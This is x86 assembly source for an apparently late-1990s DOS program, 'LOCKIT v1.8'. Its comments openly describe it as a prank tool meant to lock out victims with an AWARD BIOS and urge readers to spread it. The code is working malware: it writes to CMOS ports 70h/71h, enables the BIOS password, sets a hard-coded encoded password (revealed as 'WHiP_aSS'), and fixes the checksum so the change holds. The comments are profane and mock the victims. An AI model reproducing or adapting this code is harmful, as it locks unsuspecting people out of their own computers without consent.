; ***************************************************************************
;        -=x[ LOCKIT ]x=- v1.8
;
;  Koded by
;          -=x[ STaS ]=-
;                       CopyLeft by SysD Destructive Labs, 1997-1998
;
;               Cool software, that fucks any lamah
;               with any AWARD BIOS.
;               This programm MUST be distributed freely,
;               so, send it to ALL your lamah friendz!
;               If you have any comments for this code,
;               please send it to me by e-mail: stas@nettaxi.com
;               or by ICQ: 1124746
;
;       ENJOY THIS INCRIBLE FUCKING TOOL!!!!!!!!!!
;
;       REMEMBER: A NEW BIOS PASSWORD WILL BE "WHiP_aSS"
;       DON'T TELL THIS TO LAMAH!
;
; ***************************************************************************

                        ; * * * * * * * * * * *
                        ; * LaMMeRZ  ÄÄ :-(  *
                        ; * CRaCKeRZ ÄÄ :D'  *
                        ; * * * * * * * * * * *

MODEL tiny                                      ; Create .COM file...
.286                                            ; for 286

pwdH    EQU 8Bh                                 ; Here comes the password...
pwdL    EQU 53h                                 ; ...encrypted, sure!!!

CODESEG

        ORG 100h                                ; Jump PSP...

Start:
        mov     ax, 1111h                       ; CMOS function 11h
        call    ReadCMOS                        ; Read it...
        or      al, 3                           ; Set: Bit 1=1;  Bit 0=1
        xchg    al, ah                          ; Now, AL=11h
        call    WriteCMOS                       ; FUCKKKKK IT!!!!!!
                                                ; PaSSWoRD enabled!

        mov     al, 1Ch                         ; Now, write it...
        mov     ah, pwdH                        ; ...on it's CMOS location...
        call    WriteCMOS
        inc     al                              ; AL=1Dh => LOW byte
        mov     ah, pwdL                        ; of password
        call    WriteCMOS

        call    Checksum                        ; CHECKSUM was changed:
                                                ; so, update it!

        ret                                     ; RETurn to caller...
                                                ; Equal to code
                                                ; /* START CODE
                                                ; MOV AX, 4C00h
                                                ; INT 21h
                                                ; */ END CODE
                                                ; , but this one looks
                                                ; much better!

; *************************************************************************
; * SUBS                                                                  *
; *************************************************************************

PROC WriteCMOS

; ***********************************************************
;  WriteCMOS:
; 
;   INPUT:
;        AL=CMOSfunction
;        AH=Value
;   OUTPUT:
;        None
; ***********************************************************

        push    ax
        out     70h, al
        xchg    al, ah
        out     71h, al
        pop     ax

        ret

ENDP WriteCMOS

PROC ReadCMOS

; ***********************************************************
;  ReadCMOS:
; 
;   INPUT:
;        AL=CMOSfunction
;   OUTPUT:
;        AL=Value
; ***********************************************************

        out     70h, al
        in      al, 71h

        ret

ENDP ReadCMOS

PROC Checksum

; ***********************************************************
;  Checksum:
; 
;   INPUT:
;        None
;   OUTPUT:
;        None
; ***********************************************************

        push    ax
        push    bx
        push    cx

        xor     ax, ax
        xor     bx, bx
        mov     cx, 10h

        jmp     short CheckEnd
Looping:
        mov     al, cl
        call    ReadCMOS
        add     bx, ax
        inc     cl
CheckEnd:
        cmp     cl, 2Dh
        jle     short Looping

        mov     al, 2Eh
        mov     ah, bh
        call    WriteCMOS
        inc     al
        mov     ah, bl
        call    WriteCMOS

        pop     cx
        pop     bx
        pop     ax

        ret

ENDP Checksum

END Start
